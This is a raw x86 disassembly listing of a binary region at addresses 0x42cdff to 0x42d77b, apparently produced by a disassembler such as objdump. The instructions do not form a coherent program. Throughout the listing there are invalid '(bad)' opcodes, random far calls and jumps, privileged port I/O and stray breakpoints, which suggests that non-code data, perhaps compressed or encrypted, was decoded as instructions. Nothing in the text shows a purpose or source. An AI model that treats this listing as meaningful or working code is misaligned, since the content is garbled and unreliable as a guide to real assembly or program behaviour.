  42cdff:	fcom   DWORD PTR [ebx]
  42ce01:	aaa    
  42ce02:	dec    esp
  42ce03:	mul    edx
  42ce05:	adc    eax,0xcdab7946
  42ce0a:	dec    edx
  42ce0b:	inc    edi
  42ce0c:	or     al,0x8c
  42ce0e:	pop    es
  42ce0f:	jo     0x42cdff
  42ce11:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce13:	mov    esi,0x7bf8c469
  42ce18:	jl     0x42ce5d
  42ce1a:	es jne 0x42cdee
  42ce1d:	loop   0x42ce67
  42ce1f:	ins    BYTE PTR es:[edi],dx
  42ce20:	test   eax,0xdec36df3
  42ce25:	xchg   ecx,eax
  42ce26:	test   eax,0x59bb3fc
  42ce2b:	into   
  42ce2c:	cdq    
  42ce2d:	scas   al,BYTE PTR es:[edi]
  42ce2e:	sbb    DWORD PTR [eax+0x2d94a2e4],0x17
  42ce35:	sub    al,0x1b
  42ce37:	in     al,dx
  42ce38:	pop    edx
  42ce39:	test   BYTE PTR [esi-0x6c],bl
  42ce3c:	mov    ah,0xdb
  42ce3e:	aaa    
  42ce3f:	fsub   QWORD PTR [ebp-0x66dae23b]
  42ce45:	mov    BYTE PTR [ecx+0x14cde02e],bl
  42ce4b:	cmp    eax,0x712a450b
  42ce50:	add    bl,ch
  42ce52:	dec    eax
  42ce53:	push   edi
  42ce54:	std    
  42ce55:	mov    bh,0xf
  42ce58:	sbb    al,BYTE PTR [edx+0x24ae5b60]
  42ce5e:	xchg   edx,eax
  42ce5f:	callw  0x3595
  42ce63:	stos   DWORD PTR es:[edi],eax
  42ce64:	pop    ds
  42ce65:	jbe    0x42ce00
  42ce67:	(bad)  
  42ce68:	scas   al,BYTE PTR es:[edi]
  42ce69:	push   edi
  42ce6a:	shl    DWORD PTR [edi-0x662a1204],0xd4
  42ce71:	mov    edi,esi
  42ce73:	inc    ecx
  42ce74:	ja     0x42ce9b
  42ce76:	adc    dl,BYTE PTR [ebp-0x24]
  42ce79:	ss push edx
  42ce7b:	jne    0x42ce98
  42ce7d:	ffreep st(7)
  42ce7f:	mov    bh,0xc7
  42ce81:	push   edx
  42ce82:	cmp    esp,ecx
  42ce84:	lock adc BYTE PTR [esi+0x1916c4dc],0x8b
  42ce8c:	je     0x42cf01
  42ce8e:	call   0x3714:0x71eeafef
  42ce95:	inc    esp
  42ce96:	add    al,0xe8
  42ce98:	ss int3 
  42ce9a:	mov    esi,DWORD PTR [ebx+0x6ed90cd6]
  42cea0:	lods   eax,DWORD PTR ds:[esi]
  42cea1:	(bad)  
  42cea2:	std    
  42cea3:	fbstp  TBYTE PTR [edx-0x3b6c982e]
  42cea9:	int3   
  42ceaa:	adc    edx,DWORD PTR [eax-0x2b]
  42cead:	pop    es
  42ceae:	icebp  
  42ceaf:	test   al,0x12
  42ceb1:	jae    0x42cecc
  42ceb3:	mov    esp,0xf1
	...
  42cf14:	add    BYTE PTR [eax],al
  42cf16:	jae    0x42cf55
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx-0x493fd2ef]
  42cf24:	add    edx,edx
  42cf26:	cmp    ah,cl
  42cf28:	add    DWORD PTR [eax],eax
  42cf2a:	pop    es
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    dh,dh
  42cf2f:	jne    0x42cf66
  42cf31:	sbb    BYTE PTR [ecx+0x50],bh
  42cf34:	fucomi st,st(0)
  42cf36:	rol    ebx,0x48
  42cf39:	ja     0x42cfa2
  42cf3b:	mov    edi,0x8b2c853a
  42cf40:	pop    esp
  42cf41:	fisubr WORD PTR [ebx-0x4e]
  42cf44:	xor    eax,0xb004df1e
  42cf49:	sub    edi,DWORD PTR [edi]
  42cf4b:	jecxz  0x42cf44
  42cf4d:	and    esp,ebp
  42cf4f:	add    DWORD PTR [edi],esi
  42cf51:	pop    es
  42cf52:	sub    cl,bh
  42cf54:	lock loope 0x42cf40
  42cf57:	js     0x42cf24
  42cf59:	dec    esp
  42cf5a:	sub    dh,bh
  42cf5c:	inc    ebp
  42cf5d:	push   eax
  42cf5e:	mov    cl,0xfa
  42cf60:	pop    ebx
  42cf61:	bound  eax,QWORD PTR [esi-0xcd6c92]
  42cf67:	xchg   ecx,eax
  42cf68:	or     DWORD PTR [edx],edx
  42cf6a:	inc    ebx
  42cf6b:	dec    edi
  42cf6c:	cmp    esi,DWORD PTR ds:0xc90f4b88
  42cf72:	repz jb 0x42cf13
  42cf75:	adc    eax,0xca0b696e
  42cf7a:	fwait
  42cf7b:	icebp  
  42cf7c:	adc    ah,cl
  42cf7e:	fwait
  42cf7f:	mov    bl,0xd0
  42cf81:	popf   
  42cf82:	push   ss
  42cf83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf84:	call   0xa906:0x65e30504
  42cf8b:	mov    bh,0x3f
  42cf8d:	retf   0xe06a
  42cf90:	mov    dh,0x90
  42cf92:	sub    ebx,DWORD PTR [ebx-0x39]
  42cf95:	adc    dl,BYTE PTR [ebp-0x12]
  42cf98:	clc    
  42cf99:	std    
  42cf9a:	psraw  mm2,QWORD PTR [esi-0x44]
  42cf9e:	pushf  
  42cf9f:	in     eax,0xeb
  42cfa1:	call   FWORD PTR [edi]
  42cfa3:	cwde   
  42cfa4:	lahf   
  42cfa5:	popa   
  42cfa6:	mov    ah,0x77
  42cfa8:	mov    ebx,0x6dcc75db
  42cfad:	repz jge 0x42cf72
  42cfb0:	iret   
  42cfb1:	lea    esi,[eax-0x47fa9bfb]
  42cfb7:	test   BYTE PTR [ebx+0x6241505c],dl
  42cfbd:	pop    ss
  42cfbe:	lock outs dx,DWORD PTR ds:[esi]
  42cfc0:	int    0xf0
  42cfc2:	(bad)  
  42cfc3:	mov    al,0x8d
  42cfc5:	(bad)  
  42cfc6:	jmp    0xf0d91cc
  42cfcb:	into   
  42cfcc:	popa   
  42cfcd:	and    al,0xc3
  42cfcf:	inc    edx
  42cfd0:	mov    cl,0xc3
  42cfd2:	push   ecx
  42cfd3:	fdivr  DWORD PTR [esi]
  42cfd5:	sub    BYTE PTR [ebx-0x2f],cl
  42cfd8:	mov    al,0x74
  42cfda:	pushfw 
  42cfdc:	pop    ebx
  42cfdd:	mov    edx,0xcf254637
  42cfe2:	add    edx,DWORD PTR [edx]
  42cfe4:	cmp    BYTE PTR [edx+0x51],bh
  42cfe7:	cmp    BYTE PTR [ebx+0x72],ch
  42cfea:	call   0x632b6697
  42cfef:	(bad)  
  42cff0:	xor    eax,0x4abba29f
  42cff5:	mov    ds,WORD PTR ds:0xf14a150b
  42cffb:	inc    eax
  42cffc:	outs   dx,DWORD PTR ds:[esi]
  42cffd:	cwde   
  42cffe:	lahf   
  42cfff:	dec    esi
  42d000:	scas   al,BYTE PTR es:[edi]
  42d001:	fild   WORD PTR [ebx+0x58]
  42d004:	xchg   eax,esp
  42d006:	sub    al,0xca
  42d008:	mov    eax,ds:0x732cfebc
  42d00d:	mov    ebx,0x3c631804
  42d012:	add    DWORD PTR [ebp-0x4d66abe3],eax
  42d018:	pop    es
  42d019:	ins    BYTE PTR es:[edi],dx
  42d01a:	les    ebx,FWORD PTR [ebx]
  42d01c:	fistp  WORD PTR [eax+0x52]
  42d01f:	jmp    0xe3dbe29a
  42d024:	retf   
  42d025:	sub    BYTE PTR cs:[edx],cl
  42d028:	jns    0x42d085
  42d02a:	pop    esi
  42d02b:	jns    0x42d082
  42d02d:	sbb    al,0x1f
  42d02f:	xor    BYTE PTR [edi+0x167ae97e],bl
	...
  42d095:	add    BYTE PTR [eax+0x3a],dl
  42d098:	(bad)  
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	sub    DWORD PTR [ebp-0x1dbe6b25],esp
  42d0a8:	add    DWORD PTR [eax],eax
  42d0aa:	pop    es
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    cl,dl
  42d0af:	push   esi
  42d0b0:	(bad)  
  42d0b1:	push   ds
  42d0b2:	jmp    0x42d0ff
  42d0b4:	pusha  
  42d0b5:	je     0x42d0bf
  42d0b7:	mov    al,0xbf
  42d0b9:	push   esp
  42d0ba:	and    eax,0x424c5b9
  42d0bf:	stc    
  42d0c0:	(bad)  
  42d0c1:	xchg   edx,eax
  42d0c2:	psraw  mm2,QWORD PTR ds:0xd382dbf6
  42d0c9:	out    dx,eax
  42d0ca:	push   eax
  42d0cb:	cmp    eax,0x474a0f85
  42d0d0:	xchg   DWORD PTR [eax-0x63],esi
  42d0d3:	dec    ebp
  42d0d4:	mov    bl,0xd7
  42d0d6:	dec    edi
  42d0d7:	aaa    
  42d0d8:	popa   
  42d0d9:	xor    DWORD PTR [esi-0x314b6afd],ebx
  42d0df:	lds    esi,FWORD PTR [edi]
  42d0e1:	rcl    BYTE PTR [eax],cl
  42d0e3:	or     eax,0xb7f2f879
  42d0e8:	sub    eax,0x90c2e0e4
  42d0ed:	jae    0x42d14f
  42d0ef:	not    BYTE PTR [ecx+0x74]
  42d0f2:	sbb    edx,DWORD PTR [esi+0x49]
  42d0f5:	test   DWORD PTR [ebp-0x9e336f9],edx
  42d0fb:	mov    bh,0xf4
  42d0fd:	loopne 0x42d0dd
  42d0ff:	or     al,0x8
  42d101:	repnz iret 
  42d103:	jmp    0x4a45cac7
  42d108:	adc    eax,0xd4583946
  42d10d:	push   esi
  42d10e:	pop    ebx
  42d10f:	jno    0x42d0cc
  42d111:	rcr    DWORD PTR [ebp+0x3b],0x47
  42d115:	stos   DWORD PTR es:[edi],eax
  42d116:	mov    ds:0x1e9881a5,eax
  42d11b:	adc    ebp,DWORD PTR [edi+0x0]
  42d11e:	cli    
  42d11f:	hlt    
  42d120:	sbb    esi,edi
  42d122:	jmp    0x91db:0x2bb24a3a
  42d129:	inc    edx
  42d12a:	inc    esi
  42d12b:	out    dx,al
  42d12c:	mov    bl,0xa6
  42d12e:	repz repz inc esp
  42d131:	fimul  WORD PTR [ebp-0x7390211a]
  42d137:	cld    
  42d138:	stos   BYTE PTR es:[edi],al
  42d139:	in     eax,0x80
  42d13b:	jmp    0x42d120
  42d13d:	sbb    eax,0xcdc4170c
  42d142:	cmp    DWORD PTR [ebx+0x68a9d349],esi
  42d148:	dec    edx
  42d149:	adc    BYTE PTR [ecx+0x23],ch
  42d14c:	push   ax
  42d14e:	shl    DWORD PTR [ebp-0x26],0x5e
  42d152:	dec    eax
  42d153:	inc    ebx
  42d154:	int3   
  42d155:	sbb    eax,0x42c2ed47
  42d15a:	mov    ah,cl
  42d15c:	(bad)  
  42d15d:	jp     0x42d1ae
  42d15f:	jo     0x42d153
  42d161:	adc    eax,0x2cffb43e
  42d166:	mov    dl,0xd3
  42d168:	aad    0xfa
  42d16a:	shr    DWORD PTR [esi+0x7c],cl
  42d16d:	pop    esi
  42d16e:	cli    
  42d16f:	arpl   WORD PTR ds:0x86888d4e,cx
  42d175:	mov    bh,0xdc
  42d177:	shr    BYTE PTR [ecx],cl
  42d179:	pop    ds
  42d17a:	push   ss
  42d17b:	addr16 add ebp,ebp
  42d17e:	jmp    0x42d1f3
  42d180:	in     eax,dx
  42d181:	push   esp
  42d182:	out    dx,al
  42d183:	lea    eax,[ebx]
  42d185:	loopne 0x42d1f0
  42d187:	inc    esi
  42d188:	mov    esp,0x11ea755c
  42d18d:	adc    edx,DWORD PTR [ebx+0x34e41607]
  42d193:	(bad)  
  42d194:	cli    
  42d195:	je     0x42d151
  42d197:	pop    ebp
  42d198:	in     al,dx
  42d199:	adc    al,0xc
  42d19b:	xchg   ebp,eax
  42d19c:	or     al,0x58
  42d19e:	mov    ds:0x4edabc0e,eax
  42d1a3:	mov    bh,0xce
  42d1a5:	jo     0x42d138
  42d1a7:	or     al,0x63
  42d1a9:	dec    eax
  42d1aa:	pop    ecx
  42d1ab:	xchg   BYTE PTR [edx-0x1a],ah
  42d1ae:	not    DWORD PTR [ebx]
  42d1b0:	pop    edi
  42d1b1:	push   eax
  42d1b2:	call   0x0:0x2a98
	...
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	push   ebp
  42d223:	cdq    
  42d224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d225:	call   0x44b572
  42d22a:	pop    es
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    BYTE PTR [ebx+0x7828c40a],ch
  42d233:	mov    dl,BYTE PTR [esi+ebp*8]
  42d236:	test   al,0x87
  42d238:	mov    esi,0x144ffd62
  42d23d:	es jns 0x42d267
  42d240:	xchg   esi,esi
  42d242:	retf   
  42d243:	push   esp
  42d244:	mov    bl,0x9a
  42d246:	pop    edi
  42d247:	ja     0x42d261
  42d249:	cmp    al,0xe8
  42d24b:	sub    BYTE PTR [ecx-0x5b],ah
  42d24e:	lahf   
  42d24f:	and    al,0x63
  42d251:	clc    
  42d252:	cmc    
  42d253:	int3   
  42d254:	and    edx,eax
  42d256:	mov    al,ds:0x3cdc7ad4
  42d25b:	mov    al,0x34
  42d25d:	loope  0x42d1fd
  42d25f:	sub    esp,DWORD PTR [eax+0x1c9ef724]
  42d265:	dec    edx
  42d266:	push   esp
  42d267:	scas   al,BYTE PTR es:[edi]
  42d268:	jbe    0x42d212
  42d26a:	cmp    cl,cl
  42d26c:	(bad)  [ecx]
  42d26e:	cmp    eax,0x3bc6d964
  42d273:	lock das 
  42d275:	cwde   
  42d276:	pop    ebp
  42d277:	mov    bl,0x58
  42d279:	or     eax,0xbc726d5a
  42d27e:	push   esi
  42d27f:	mov    ah,BYTE PTR [esi-0x32]
  42d282:	cmp    BYTE PTR [eax+0x3a9d7c88],dh
  42d288:	push   eax
  42d289:	aas    
  42d28a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d28b:	nop
  42d28c:	in     al,0x29
  42d28e:	dec    edi
  42d28f:	lods   al,BYTE PTR ds:[esi]
  42d290:	xor    BYTE PTR [ebx+edx*2],ch
  42d293:	ins    DWORD PTR es:[edi],dx
  42d294:	fimul  DWORD PTR [esp+ebx*8+0x3c]
  42d298:	fbld   TBYTE PTR [ecx+ecx*8+0x739aac39]
  42d29f:	jl     0x42d2e1
  42d2a1:	repz lds edi,FWORD PTR [ecx+0x3c]
  42d2a5:	or     edi,edi
  42d2a7:	dec    edi
  42d2a8:	push   edi
  42d2a9:	aas    
  42d2aa:	clc    
  42d2ab:	inc    esp
  42d2ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2ad:	test   BYTE PTR [ebx+0x4f00d075],ah
  42d2b3:	push   esi
  42d2b4:	xor    bh,BYTE PTR [ecx+esi*1]
  42d2b7:	mov    fs,edx
  42d2b9:	xor    ecx,DWORD PTR ds:0xeba22be9
  42d2bf:	in     eax,dx
  42d2c0:	fdiv   DWORD PTR [edx-0x47]
  42d2c3:	jne    0x42d33c
  42d2c5:	jg     0x42d29d
  42d2c7:	fwait
  42d2c8:	jle    0x42d2a6
  42d2ca:	xchg   DWORD PTR [eax],esp
  42d2cc:	loop   0x42d2c1
  42d2ce:	retf   
  42d2cf:	mov    ds:0x1b46184d,eax
  42d2d4:	and    al,ah
  42d2d6:	scas   eax,DWORD PTR es:[di]
  42d2d8:	rcr    BYTE PTR [ebp-0x14],0x2e
  42d2dc:	loopne 0x42d2ed
  42d2de:	nop
  42d2df:	or     eax,0x4095e5bf
  42d2e4:	xor    DWORD PTR [ebp+esi*1-0x2c851a2d],0x22c4181
  42d2ef:	jp     0x42d2cd
  42d2f1:	push   0x24e74e71
  42d2f6:	mov    WORD PTR cs:[edx+esi*8-0x6b0ae91a],ds
  42d2fe:	cmp    esi,DWORD PTR [esp+edi*4+0x6d]
  42d302:	xchg   BYTE PTR [ecx+0x68],dl
  42d305:	xor    eax,0xa83e9851
  42d30a:	push   ecx
  42d30b:	adc    esp,DWORD PTR [ecx-0x78091185]
  42d311:	mov    ebp,0xe5ccb0bc
  42d316:	not    DWORD PTR ds:0xc39105d8
  42d31c:	push   ds
  42d31d:	lds    ebp,FWORD PTR [ecx]
  42d31f:	add    eax,0xb3a5c1c4
  42d324:	and    eax,0xf86e296a
  42d329:	xor    eax,0x4eedbb0b
  42d32e:	sub    esp,DWORD PTR [ecx]
  42d330:	jge    0x42d2e2
  42d332:	push   es
  42d333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d334:	popf   
	...
  42d395:	add    cl,al
  42d397:	into   
  42d398:	arpl   WORD PTR [ecx-0x21044291],bx
  42d39e:	cmp    BYTE PTR [esp+ecx*8+0x797ec058],bl
  42d3a5:	or     BYTE PTR [edi-0x1c],0x1
  42d3a9:	add    BYTE PTR [edi],al
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    dl,cl
  42d3af:	xchg   edi,eax
  42d3b0:	push   0x766b107a
  42d3b5:	clc    
  42d3b6:	jecxz  0x42d396
  42d3b8:	mov    edx,0x40b29f49
  42d3bd:	pop    eax
  42d3be:	adc    DWORD PTR [esp+ebx*8],esi
  42d3c1:	out    dx,al
  42d3c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d3c3:	out    0xd8,eax
  42d3c5:	ja     0x42d35e
  42d3c7:	addr16 sbb eax,0x14e4dedd
  42d3cd:	out    0x22,eax
  42d3cf:	inc    edx
  42d3d0:	mov    DWORD PTR [esi-0x47841c8f],esp
  42d3d6:	lods   al,BYTE PTR ds:[esi]
  42d3d7:	push   ds
  42d3d8:	adc    eax,DWORD PTR [edi+eiz*8-0x34]
  42d3dc:	mov    esp,0x7a22ea23
  42d3e1:	pop    esi
  42d3e2:	sbb    ah,BYTE PTR [ebp-0x4c]
  42d3e5:	fistp  DWORD PTR [ebp+edx*8-0x2c837466]
  42d3ec:	rol    DWORD PTR cs:[esi+0x76],cl
  42d3f0:	mov    dl,0x94
  42d3f2:	stc    
  42d3f3:	test   BYTE PTR [eax],dl
  42d3f5:	fdivr  QWORD PTR [ecx-0x2d]
  42d3f8:	neg    DWORD PTR [ebp+0x47]
  42d3fb:	jge    0x42d3da
  42d3fd:	xchg   esi,eax
  42d3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d3ff:	or     edi,DWORD PTR [ecx]
  42d401:	bnd jb 0x42d389
  42d404:	stos   BYTE PTR es:[edi],al
  42d405:	add    eax,0xada03c76
  42d40a:	neg    DWORD PTR [esi]
  42d40c:	gs cwde 
  42d40e:	mov    ah,0x10
  42d410:	test   bh,cl
  42d412:	repnz add cl,BYTE PTR [ecx+0x54]
  42d416:	xchg   esi,eax
  42d417:	pusha  
  42d418:	ds jmp 0x42d409
  42d41b:	bound  ebx,QWORD PTR [bx-0xd]
  42d41f:	in     eax,0x5a
  42d421:	sub    al,0xa8
  42d423:	push   cs
  42d424:	inc    edi
  42d425:	mov    ds:0x4089e180,al
  42d42a:	sbb    DWORD PTR [eax-0x3033a54d],ecx
  42d430:	add    DWORD PTR [ebx-0x3ffb96b4],ecx
  42d436:	into   
  42d437:	cdq    
  42d438:	jl     0x42d45d
  42d43a:	shl    DWORD PTR [edi+0x1e682232],0xbc
  42d441:	call   0x880c:0xc3362fd7
  42d448:	mov    ebp,0x49b3f630
  42d44d:	sub    al,0x5d
  42d44f:	ins    DWORD PTR es:[edi],dx
  42d450:	push   ecx
  42d451:	clc    
  42d452:	into   
  42d453:	sti    
  42d454:	dec    eax
  42d455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d456:	lock and eax,0xc19950ea
  42d45c:	stc    
  42d45d:	ins    BYTE PTR es:[edi],dx
  42d45e:	loope  0x42d47b
  42d460:	mov    ah,0x28
  42d462:	imul   edi,DWORD PTR [ebx-0x6d2d727],0xffffffcf
  42d469:	pop    ss
  42d46a:	add    BYTE PTR [ebp+0x2c77255f],ch
  42d470:	ror    DWORD PTR ds:0x9cfc5b12,cl
  42d476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d477:	add    ecx,DWORD PTR [edi-0x58d903c3]
  42d47d:	or     BYTE PTR [ebp+0x4c],bh
  42d480:	and    BYTE PTR [eax-0x650b807e],dh
  42d486:	cwde   
  42d487:	xor    dl,BYTE PTR [edx-0x25]
  42d48a:	push   ecx
  42d48b:	dec    eax
  42d48c:	xchg   edx,eax
  42d48d:	sub    BYTE PTR [eax+eax*1],cl
  42d490:	adc    eax,0x451548ed
  42d495:	dec    edx
  42d496:	push   edx
  42d497:	or     al,0x51
  42d499:	push   ecx
  42d49a:	pop    es
  42d49b:	add    eax,edx
  42d49d:	and    eax,0xb8189a91
  42d4a2:	add    bl,cl
  42d4a4:	ins    DWORD PTR es:[edi],dx
  42d4a5:	jbe    0x42d4eb
  42d4a7:	adc    DWORD PTR [edi],ecx
  42d4a9:	pop    esi
  42d4aa:	test   BYTE PTR [edi-0x6094e62],bl
  42d4b0:	add    al,0xb6
  42d4b2:	or     ah,cl
  42d4b4:	jp     0x42d4b6
	...
  42d516:	cdq    
  42d517:	cmc    
  42d518:	adc    BYTE PTR [ebx-0x12],0x77
  42d51c:	fcos   
  42d51e:	add    BYTE PTR [ebx],al
  42d520:	nop
  42d521:	repz sub esi,esp
  42d524:	fwait
  42d525:	xchg   edx,eax
  42d526:	push   esi
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    BYTE PTR [ebx+ebp*2-0x62],ah
  42d531:	out    dx,eax
  42d532:	enter  0xdcb3,0x19
  42d536:	push   ds
  42d537:	jmp    FWORD PTR [esi+0x39]
  42d53a:	xchg   DWORD PTR ds:0xb05a7544,edx
  42d540:	pop    esi
  42d541:	cmp    eax,0x1c79d6a5
  42d546:	ret    
  42d547:	lods   al,BYTE PTR ds:[esi]
  42d548:	out    dx,al
  42d549:	cmc    
  42d54a:	mov    ds:0xf180555a,eax
  42d54f:	push   edx
  42d550:	imul   esi,DWORD PTR [ebx-0x6a],0xffffffdd
  42d554:	dec    eax
  42d555:	stos   DWORD PTR es:[edi],eax
  42d556:	pop    es
  42d557:	mov    ecx,DWORD PTR ds:0xa0ab0478
  42d55d:	shl    dh,0xb5
  42d560:	stos   DWORD PTR es:[edi],eax
  42d561:	sbb    esi,DWORD PTR [edi+0x7b025fdf]
  42d567:	jp     0x42d5e2
  42d569:	xor    DWORD PTR ds:[ebp+esi*8+0x2cb2f948],eax
  42d571:	enter  0x3aa2,0xc5
  42d575:	jg     0x42d5dc
  42d577:	mov    esi,0x18c49f3b
  42d57c:	daa    
  42d57d:	or     DWORD PTR [edx+esi*8-0x20b5b4f8],edi
  42d584:	sbb    BYTE PTR [ecx+0x58],al
  42d587:	in     al,0x5f
  42d589:	push   ebx
  42d58a:	jmp    0x42d550
  42d58c:	loopne 0x42d572
  42d58e:	aas    
  42d58f:	pushf  
  42d590:	xchg   esp,eax
  42d591:	push   es
  42d592:	(bad)  
  42d593:	push   esi
  42d594:	outs   dx,BYTE PTR ds:[esi]
  42d595:	je     0x886adf5c
  42d59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d59c:	mov    bh,0x63
  42d59e:	sub    esp,ecx
  42d5a0:	lods   al,BYTE PTR ds:[esi]
  42d5a1:	add    eax,0x4d21b9fa
  42d5a6:	daa    
  42d5a7:	repnz out dx,al
  42d5a9:	lods   eax,DWORD PTR ds:[esi]
  42d5aa:	cmc    
  42d5ab:	pop    esi
  42d5ac:	stos   BYTE PTR es:[edi],al
  42d5ad:	pop    ecx
  42d5ae:	aaa    
  42d5af:	(bad)  
  42d5b0:	mov    al,0x5d
  42d5b2:	mov    esi,0x2cd5054e
  42d5b7:	jne    0x42d5f9
  42d5b9:	out    0x11,eax
  42d5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5bc:	out    0x8a,eax
  42d5be:	mov    bl,0x67
  42d5c0:	ret    
  42d5c1:	in     eax,dx
  42d5c2:	ret    
  42d5c3:	(bad)  
  42d5c4:	pop    ebp
  42d5c5:	in     eax,dx
  42d5c6:	not    ecx
  42d5c8:	pop    ss
  42d5c9:	inc    ebp
  42d5ca:	push   eax
  42d5cb:	cli    
  42d5cc:	nop
  42d5cd:	mov    ?,WORD PTR [ebx-0x3c]
  42d5d0:	arpl   bx,sp
  42d5d2:	imul   esi,DWORD PTR [esi-0x23],0x271d4e8e
  42d5d9:	ret    0xe412
  42d5dc:	push   ebx
  42d5dd:	daa    
  42d5de:	cmp    al,bh
  42d5e0:	(bad)  
  42d5e1:	(bad)  
  42d5e2:	sub    eax,0x7d
  42d5e5:	enter  0xf805,0x8
  42d5e9:	jns    0x42d657
  42d5eb:	and    DWORD PTR ds:0x1dd2772d,edi
  42d5f1:	(bad)  
  42d5f2:	fistp  WORD PTR cs:[edi-0x11]
  42d5f6:	inc    edi
  42d5f7:	cmp    ebp,DWORD PTR [ecx+0x6a9bdd91]
  42d5fd:	js     0x42d5d7
  42d5ff:	lea    eax,ss:[eax-0x13]
  42d603:	push   esp
  42d604:	jae    0x42d618
  42d606:	mov    dh,0xd5
  42d608:	pop    edi
  42d609:	mov    ah,0x21
  42d60b:	stc    
  42d60c:	pop    esi
  42d60d:	adc    al,0x37
  42d60f:	jb     0x42d5dc
  42d611:	(bad)  cs:[eax+eiz*4+0x70]
  42d616:	jmp    0xd0101737
  42d61b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d61c:	aaa    
  42d61d:	js     0x42d657
  42d61f:	pop    ebp
  42d620:	ins    DWORD PTR es:[edi],dx
  42d621:	inc    eax
  42d622:	sbb    esi,edi
  42d624:	sub    cl,BYTE PTR [edx+eax*4+0xba965cb]
  42d62b:	stc    
  42d62c:	int3   
  42d62d:	rep lods al,BYTE PTR ds:[esi]
  42d62f:	mov    eax,ebp
  42d631:	pop    edi
  42d632:	jnp    0x42d5ce
  42d634:	push   esp
	...
  42d695:	add    bl,dh
  42d697:	add    esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0xa2c58d59
  42d6a4:	sub    ecx,DWORD PTR [ebx]
  42d6a6:	pop    ebp
  42d6a7:	out    0x1,al
  42d6a9:	add    BYTE PTR [edi],al
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    BYTE PTR [eax+0x1f],al
  42d6b0:	add    BYTE PTR [edx-0x734526ce],0xe9
  42d6b7:	and    al,0x5b
  42d6b9:	or     al,0xed
  42d6bb:	out    0xec,eax
  42d6bd:	in     al,dx
  42d6be:	mov    bl,0xd6
  42d6c0:	aas    
  42d6c1:	inc    ebx
  42d6c2:	bound  edx,QWORD PTR [esi-0x7e]
  42d6c5:	cmp    eax,0xffffffa2
  42d6c8:	and    eax,0xa47fa287
  42d6cd:	mul    cl
  42d6cf:	lahf   
  42d6d0:	mov    ecx,ebp
  42d6d2:	mov    edi,DWORD PTR [esi]
  42d6d4:	adc    ebx,DWORD PTR ds:0x5c3dfe63
  42d6da:	xor    BYTE PTR [edi+0xb6639b],dl
  42d6e0:	leave  
  42d6e1:	inc    ecx
  42d6e2:	out    dx,al
  42d6e3:	add    DWORD PTR [ebx-0x466af2cd],0x24
  42d6ea:	push   ecx
  42d6eb:	ss jmp 0x53fcab72
  42d6f1:	jg     0x42d6cb
  42d6f3:	sub    cl,ch
  42d6f5:	std    
  42d6f6:	rol    esi,cl
  42d6f8:	or     DWORD PTR ds:0x1d057e52,edi
  42d6fe:	ret    0xccb0
  42d701:	test   al,0xd8
  42d703:	and    DWORD PTR [edi+0x5b067c6f],eax
  42d709:	pop    esi
  42d70a:	xchg   ecx,eax
  42d70b:	fwait
  42d70c:	daa    
  42d70d:	push   ecx
  42d70e:	test   al,dh
  42d710:	pusha  
  42d711:	stos   DWORD PTR es:[edi],eax
  42d712:	or     eax,edi
  42d714:	leave  
  42d715:	pop    ds
  42d716:	sbb    al,0x6b
  42d718:	cmp    bh,bl
  42d71a:	fistp  WORD PTR [esi-0x1dbd8ef0]
  42d720:	lahf   
  42d721:	cmp    eax,0x6bb4724a
  42d726:	pop    bx
  42d728:	fnstcw WORD PTR [ebp-0x25]
  42d72b:	jl     0x42d6f9
  42d72d:	sub    eax,0xbadd1d40
  42d732:	div    BYTE PTR [edx+ecx*1]
  42d735:	cmp    DWORD PTR [ecx+0x281c31b4],ebp
  42d73b:	pop    ds
  42d73c:	enter  0xd25,0xcf
  42d740:	jns    0x42d7be
  42d742:	stos   DWORD PTR es:[edi],eax
  42d743:	in     al,0x7b
  42d745:	mov    ds:0x98c9616e,al
  42d74a:	sub    eax,DWORD PTR [ebx+0xe]
  42d74d:	out    0xb1,eax
  42d74f:	iret   
  42d750:	cmc    
  42d751:	arpl   WORD PTR [edi-0x1487599f],sp
  42d757:	cli    
  42d758:	push   0xffffff93
  42d75a:	jns    0x42d763
  42d75c:	adc    BYTE PTR [ebp+0x6ccb202d],cl
  42d762:	fwait
  42d763:	lahf   
  42d764:	pop    ds
  42d765:	jne    0x42d732
  42d767:	pusha  
  42d768:	sti    
  42d769:	sub    esp,ecx
  42d76b:	sub    cl,BYTE PTR [eax]
  42d76d:	mov    bh,dl
  42d76f:	out    0x25,al
  42d771:	lods   eax,DWORD PTR ds:[esi]
  42d772:	in     eax,0x26
  42d774:	mov    ah,BYTE PTR [edi+0x4ac74fa]
  42d77a:	inc    ebp
  42d77b:	fs inc ebp
